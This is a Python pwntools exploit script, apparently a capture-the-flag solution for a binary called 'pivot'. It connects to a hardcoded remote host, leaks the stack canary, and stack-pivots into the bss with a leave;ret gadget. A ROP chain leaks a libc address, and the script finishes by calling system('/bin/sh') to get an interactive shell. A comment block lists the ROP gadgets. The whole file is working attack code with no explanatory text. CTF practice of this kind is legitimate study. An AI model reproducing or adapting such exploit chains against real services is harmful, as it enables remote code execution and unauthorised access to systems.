from pwn import *
# context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])

# io=process("./pivot")
io=remote("43.143.7.127",28442)
elf=ELF("./pivot")
libc=ELF("./libc.so.6")

puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
one_gadget=[0x50a37,0xebcf1,0xebcf5,0xebcf8,0xebd52,0xebdaf,0xebdb3]
pop_rdi_ret=0x401343
bss_addr=0x404080+0x900
leave_ret=0x401213
read_text=0x4011D4
vuln=0x4011b6

io.recvuntil(b"Name:\n")
payload=b"a"*0x28

# gdb.attach(io)
# pause()

io.sendline(payload)
io.recvuntil(b"a\n")
canary=u64(io.recv(7).rjust(8,b"\x00"))
print("canary:  "+hex(canary))

payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text)
io.send(payload)

io.recvuntil(b"\n")
payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b"a")+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.send(payload)
io.recvuntil(b"BYE.\n")
io.recvuntil(b"BYE.\n")
base_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"puts"]
print("base_addr:  "+hex(base_addr))

sys_addr=base_addr+libc.sym[b"system"]
str_bin_sh=base_addr+next(libc.search(b"/bin/sh"))

shell=one_gadget[1]+base_addr
print("sys_addr:  "+hex(sys_addr))
print("str_bin_sh:  "+hex(str_bin_sh))

payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x108,b"a")+p64(canary)+p64(bss_addr-0x208)+p64(leave_ret)
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401213 : leave ; ret
# 0x0000000000401196 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
# 0x00000000004012d3 : mov ecx, 0xc9fffffd ; ret
# 0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401340 : pop r14 ; pop r15 ; ret
# 0x0000000000401342 : pop r15 ; ret
# 0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401343 : pop rdi ; ret
# 0x0000000000401341 : pop rsi ; pop r15 ; ret
# 0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 14

